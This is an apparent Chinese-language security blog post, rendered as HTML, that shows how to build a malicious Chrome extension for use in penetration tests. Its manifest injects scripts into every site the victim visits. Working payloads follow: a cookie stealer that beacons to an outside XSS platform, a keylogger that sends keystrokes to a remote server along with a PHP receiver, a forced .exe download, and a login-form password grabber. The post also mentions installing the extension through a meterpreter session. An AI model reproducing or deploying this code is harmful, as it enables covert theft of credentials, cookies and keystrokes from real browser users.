@@ -1,0 +1,1675 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+
+
+
+
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "198a1f28"
+    });
+  daovoice('update');
+  </script>
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x00  Introduction众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。  撰写此文时，仅对Chrome浏览器进行了部分测试，有兴趣的小伙伴可以深入，本文主要是提供一种思路。  0x01 Write C">
+<meta name="keywords" content="Red Team;Hack;半吊子程序猿,web;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack With Chrome Extension">
+<meta property="og:url" content="https://evi1cg.github.io/archives/Hack_With_Chrome_Extension.html">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="0x00  Introduction众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。  撰写此文时，仅对Chrome浏览器进行了部分测试，有兴趣的小伙伴可以深入，本文主要是提供一种思路。  0x01 Write C">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/4071953794.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/982629901.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/3578460025.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/4230838136.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/3707313364.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/2936310921.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/3776416730.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/2556163032.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/2028426856.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/3487428383.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/3309335995.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/1685198453.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/416552522.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/2208488495.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/04/3707313364.png">
+<meta property="og:updated_time" content="2019-01-15T05:43:36.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hack With Chrome Extension">
+<meta name="twitter:description" content="0x00  Introduction众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。  撰写此文时，仅对Chrome浏览器进行了部分测试，有兴趣的小伙伴可以深入，本文主要是提供一种思路。  0x01 Write C">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2016/04/4071953794.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evi1cg's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://evi1cg.github.io/archives/Hack_With_Chrome_Extension.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Hack With Chrome Extension | Evi1cg's blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-132188022-1');
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</head>
+
+<body itemscope="" itemtype="https://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="https://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evi1cg's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档 menu-item-active">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archive" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-工具">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools" rel="section"><i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>工具</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-友链">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/friends" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i> <br>友链</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Hack_With_Chrome_Extension.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Hack With Chrome Extension
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2016-04-19 07:08:00" itemprop="dateCreated datePublished" datetime="2016-04-19T07:08:00+08:00">2016-04-19</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/奇技淫巧/" itemprop="url" rel="index"><span itemprop="name">奇技淫巧</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/Hack_With_Chrome_Extension.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/Hack_With_Chrome_Extension.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00  Introduction"></a>0x00  Introduction</h2><p>众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。</p>
+<blockquote>
+<p>撰写此文时，仅对Chrome浏览器进行了部分测试，有兴趣的小伙伴可以深入，本文主要是提供一种思路。</p>
+</blockquote>
+<h2 id="0x01-Write-Chrome-Extension"><a href="#0x01-Write-Chrome-Extension" class="headerlink" title="0x01 Write Chrome Extension"></a>0x01 Write Chrome Extension</h2><p>在知道怎么写插件之前，我们首先了解一下插件的文件结构，随便下载一个谷歌插件,将其重命名为zip后缀之后进行解压，解压后的文件目录如下：</p>
+<a id="more"></a>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/4071953794.png" alt="1459492467313.png"></p>
+<p>其中，manifest.json是主文件，来声明要写的插件的相关信息。可以把mainfest.json理解成插件的入口，即chrome需要通过manifest.json来理解你的插件要引用哪些文件 、 需要哪些权限 、 插件图标 等信息。而其他文件，就是能实现此插件功能的脚本文件以及插件图标等。</p>
+<p>下面，我们开始构造我们的hack extension。<br>首先， 编写manifest.json文件如下:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"demo"</span>,  <span class="string">//</span>插件显示的名称</span><br><span class="line">    <span class="string">"description"</span>: <span class="string">"demo"</span>, <span class="string">//</span>插件的描述</span><br><span class="line">    <span class="string">"version"</span>: <span class="string">"1.0"</span>, <span class="string">//</span>插件的版本</span><br><span class="line">    <span class="string">"manifest_version"</span>: 2, <span class="string">//</span>新版chrome强制manifest_<span class="keyword">version</span>为2</span><br><span class="line">    <span class="string">//</span>插件的图标</span><br><span class="line">    <span class="string">"icons"</span>: &#123;  </span><br><span class="line">    <span class="string">"16"</span>: <span class="string">"imgs/ico.png"</span>,</span><br><span class="line">    <span class="string">"32"</span>: <span class="string">"imgs/ico.png"</span>,</span><br><span class="line">    <span class="string">"48"</span>: <span class="string">"imgs/ico.png"</span>,</span><br><span class="line">    <span class="string">"128"</span>: <span class="string">"imgs/ico.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">//</span>定义后台的一些特性</span><br><span class="line">    <span class="string">"background"</span>:&#123;</span><br><span class="line">      <span class="string">"scripts"</span>:[  <span class="string">//</span>加载插件的时候执行的脚本</span><br><span class="line">          <span class="string">"js/call.js"</span>, </span><br><span class="line">          <span class="string">"lib/jquery.min.js"</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"content_scripts"</span>: [<span class="string">//</span>定义自动加载的内容</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"matches"</span>: [ <span class="string">//</span>满足什么样的条件执行该插件</span><br><span class="line">                <span class="string">"&lt;all_urls&gt;"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"js"</span>: [</span><br><span class="line">                <span class="string">"lib/jquery.min.js"</span>, <span class="string">//</span>满足以后执行的脚本</span><br><span class="line">                <span class="string">"js/check.js"</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">  <span class="string">//</span>插件的权限</span><br><span class="line">  <span class="string">"permissions"</span>: [</span><br><span class="line">      <span class="string">"tabs"</span>,</span><br><span class="line">      <span class="string">"http://*/"</span>,</span><br><span class="line">      <span class="string">"https://*/"</span>,</span><br><span class="line">      <span class="string">"background"</span>,</span><br><span class="line">      <span class="string">"webRequest"</span>,</span><br><span class="line">      <span class="string">"storage"</span>,</span><br><span class="line">      <span class="string">"browsingData"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>创建以下文件：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/982629901.png" alt="1459496578341.png"></p>
+<p>现在，所有的文件就全了，但是还没什么功能，尝试加载一下插件，浏览器URL栏输入 <code>chrome://extensions/</code> 选择加载已解压的扩展程序，之后选择文件所在的文件夹。</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/3578460025.png" alt="1459494596347.png"></p>
+<p>然后插件就已经被加载上了：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/4230838136.png" alt="1459496597966.png"></p>
+<h2 id="0x02-How-to-Hack"><a href="#0x02-How-to-Hack" class="headerlink" title="0x02 How to Hack"></a>0x02 How to Hack</h2><p>插件已经可以被成功加载了，怎么使用它来进行攻击呢，我们开始编写。</p>
+<h3 id="1、XSS-Platform"><a href="#1、XSS-Platform" class="headerlink" title="1、XSS Platform"></a>1、XSS Platform</h3><p>配置XSS平台，获取项目代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://t.cn/xxxxxxx</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>访问<a href="http://t.cn/xxxxxx" target="_blank" rel="noopener">http://t.cn/xxxxxx</a> 获取代码，将其写入check.js，内容如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">﻿﻿(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;(<span class="keyword">new</span> Image()).src=<span class="string">'http://xss9.com/index.php?do=api&amp;id=xxxxxx&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> (<span class="built_in">window</span>.opener &amp;&amp; <span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)());&#125;)();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">''</span>==<span class="number">1</span>)&#123;keep=<span class="keyword">new</span> Image();keep.src=<span class="string">'http://xss9.com/index.php?do=keepsession&amp;id=xxxxxx&amp;url='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.location)+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>保存文件，重新加载插件，访问任意网站，获取访问网站的cookie信息，如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/3707313364.png" alt="1459495933492.png"></p>
+<h3 id="2、Keyloger"><a href="#2、Keyloger" class="headerlink" title="2、Keyloger"></a>2、Keyloger</h3><p>将以下Payload写入check.js中：<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> server = <span class="string">"http://server.com/"</span>; <span class="comment">//接收服务器</span></span><br><span class="line">    <span class="keyword">var</span> gate = <span class="string">"data.php?data="</span>;  <span class="comment">//接收文件</span></span><br><span class="line">    <span class="keyword">var</span> tabURL = <span class="built_in">window</span>.location.href;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">var</span> keys=<span class="string">''</span>;</span><br><span class="line">    <span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">get</span> = <span class="built_in">window</span>.event?event:e;</span><br><span class="line">      key = <span class="keyword">get</span>.keyCode?<span class="keyword">get</span>.keyCode:<span class="keyword">get</span>.charCode;</span><br><span class="line">      key = <span class="built_in">String</span>.fromCharCode(key);</span><br><span class="line">      keys+=key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">new</span> Image().src = server+gate+keys;</span><br><span class="line">      keys = <span class="string">''</span>;</span><br><span class="line">    &#125;, <span class="number">1000</span>);        </span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
+<p>接收php文件如下，将此文件命名为data.php置于服务器上：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$txt = $_GET[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">$log = fopen(<span class="string">"keylog.txt"</span>, <span class="string">"a"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span></span><br><span class="line"><span class="php">fwrite($log, $txt);</span></span><br><span class="line"><span class="php">fclose($log);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>需要在服务器上建立keylog.txt,然后给777权限就可以了</p>
+</blockquote>
+<p>加载插件以后，键盘记录启动，当用户在网页中进行键盘输入时，输入数据会发送到远程服务器。</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/2936310921.png" alt="1459497942594.png"></p>
+<h3 id="3、ForceDownload"><a href="#3、ForceDownload" class="headerlink" title="3、ForceDownload"></a>3、ForceDownload</h3><p>强制下载文件Payload如下，此payload即安装插件以后，访问任意网站强制下载程序：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> server = <span class="string">"http://server.com/"</span>; <span class="comment">//服务器</span></span><br><span class="line">    <span class="keyword">var</span> gate = <span class="string">"/test/test.exe"</span>; <span class="comment">//要下载的文件</span></span><br><span class="line">    <span class="keyword">var</span> tabURL = <span class="built_in">window</span>.location.href;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">link.href = server+gate;</span><br><span class="line">link.download = <span class="string">''</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(link);</span><br><span class="line">link.click();    </span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
+<h3 id="4、Get-Wooyun-Password"><a href="#4、Get-Wooyun-Password" class="headerlink" title="4、Get Wooyun Password"></a>4、Get Wooyun Password</h3><p>以下Payload 用于获取登陆wooyun的账号密码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> server = <span class="string">"http://xss9.com/"</span>; <span class="comment">//发送地址</span></span><br><span class="line">    <span class="keyword">var</span> gate = <span class="string">"index.php?do=api&amp;id=xxxxx"</span>; <span class="comment">//接收参数</span></span><br><span class="line">    <span class="keyword">var</span> tabURL = <span class="built_in">window</span>.location.href;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(tabURL.indexOf(<span class="string">'wooyun.org'</span>) !== <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        wooyun();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">email</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> email = <span class="built_in">document</span>.getElementsByName(<span class="string">'email'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">var</span> password = <span class="built_in">document</span>.getElementsByName(<span class="string">'password'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">var</span> data = <span class="string">"&amp;username="</span>+email+<span class="string">"&amp;password="</span>+password;</span><br><span class="line">        <span class="keyword">new</span> Image().src = server+gate+data;</span><br><span class="line">        <span class="comment">//console.log("email="+email+"&amp;password="+password)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">wooyun</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">'subbtn'</span>).onmouseover = email;</span><br><span class="line">    &#125;    </span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/3776416730.png" alt="1459502366612.png"></p>
+<blockquote>
+<p>修改payload可针对性获取某网站账号密码信息。</p>
+</blockquote>
+<p>Payload就介绍这么多了，熟悉前端的童鞋一定可以创造更多花式玩儿法。</p>
+<h2 id="0x03-When-to-Use"><a href="#0x03-When-to-Use" class="headerlink" title="0x03 When to Use"></a>0x03 When to Use</h2><p>或许小伙伴们会问，弄这个有什么用，我又不需要装这个插件抓自己的密码。当然，这个肯定不是用来搞自己的。渗透测试过程中，有没有碰到过看到管理员经常使用Chrome浏览器，而我们却没办法获取到其常用密码呢？（管理员并没有使用浏览器记住密码的功能）。这个时候，除了给系统装键盘记录器，我们还可以为其浏览器装我们编写的插件。而这个插件，就可以用来搜集各种敏感信息，而且，针对的是浏览器访问的所有网站！</p>
+<p>除此之外，我发现chrome是可以通过命令行来安装插件的，来设想一个场景，我们使用某个漏洞，或者社会工程学获取了小明的计算机控制权，现在已经有了一个meterpreter会话如下：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/2556163032.png" alt="1459820639239.png"></p>
